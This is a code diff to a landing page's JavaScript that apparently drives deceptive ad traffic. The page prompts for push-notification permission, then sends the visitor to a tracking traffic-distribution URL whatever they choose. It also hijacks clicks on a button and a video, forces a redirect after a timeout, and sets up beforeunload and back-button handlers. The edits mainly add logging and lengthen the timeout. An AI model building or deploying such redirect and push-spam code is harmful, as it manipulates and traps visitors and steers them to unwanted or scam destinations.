@@ -98,30 +98,70 @@
     const backUrl = 'https://hotbjayapa.today/tds?id=1556189731&p1=camob&p2=sub2&p3=sub3&p4=sub4';
 
     let isDone = false;
+    let pushScriptLoaded = false;
+
+    // Wait for Tacolo script to be ready
+    const checkInterval = setInterval(() => {
+        if (typeof window.onPermissionDefault !== 'undefined') {
+            pushScriptLoaded = true;
+            clearInterval(checkInterval);
+            console.log('Tacolo script loaded');
+        }
+    }, 100);
 
     function goToTDS() {
         if (isDone) return;
         isDone = true;
+        console.log('Redirecting to TDS');
         window.location.replace(tdsUrl);
     }
 
     function clickAction() {
         if (isDone) return;
         isDone = true;
+        console.log('Click action triggered - opening TDS in new tab');
         window.open(tdsUrl, '_blank');
         setTimeout(() => window.location.replace(chatUrl), 100);
     }
 
-    // TACOLO CALLBACKS
-    window.onPermissionDefault = () => goToTDS();
-    window.onPermissionDenied = () => goToTDS();
-    window.onPermissionAllowed = () => goToTDS();
-    window.onAlreadySubscribed = () => goToTDS();
-    window.onNotificationUnsupported = () => goToTDS();
-    window.onTrafficFiltered = () => goToTDS();
+    // TACOLO CALLBACKS - These will fire after user interacts with push prompt
+    window.onPermissionDefault = () => {
+        console.log('Permission default');
+        goToTDS();
+    };
+    
+    window.onPermissionDenied = () => {
+        console.log('Permission denied');
+        goToTDS();
+    };
+    
+    window.onPermissionAllowed = () => {
+        console.log('Permission allowed');
+        goToTDS();
+    };
+    
+    window.onAlreadySubscribed = () => {
+        console.log('Already subscribed');
+        goToTDS();
+    };
+    
+    window.onNotificationUnsupported = () => {
+        console.log('Notifications unsupported');
+        goToTDS();
+    };
+    
+    window.onTrafficFiltered = () => {
+        console.log('Traffic filtered');
+        goToTDS();
+    };
 
-    // Fallback timeout
-    setTimeout(() => { if (!isDone) goToTDS(); }, 5000);
+    // Extended fallback timeout - give more time for push notification
+    setTimeout(() => { 
+        if (!isDone) {
+            console.log('Fallback timeout reached');
+            goToTDS(); 
+        }
+    }, 9000); // 9 seconds
     
     // Beforeunload warning
     window.onbeforeunload = () => {
@@ -141,8 +181,18 @@
         }, 100);
     }, { once: true });
 
-    btn.addEventListener('click', (e) => { e.preventDefault(); clickAction(); });
-    video.addEventListener('click', (e) => { e.preventDefault(); clickAction(); });
+    // When button is clicked, trigger push notification flow
+    btn.addEventListener('click', (e) => { 
+        e.preventDefault(); 
+        console.log('Subscribe button clicked');
+        clickAction(); 
+    });
+    
+    video.addEventListener('click', (e) => { 
+        e.preventDefault(); 
+        console.log('Video clicked');
+        clickAction(); 
+    });
 
     // Back button handler
     (function() {
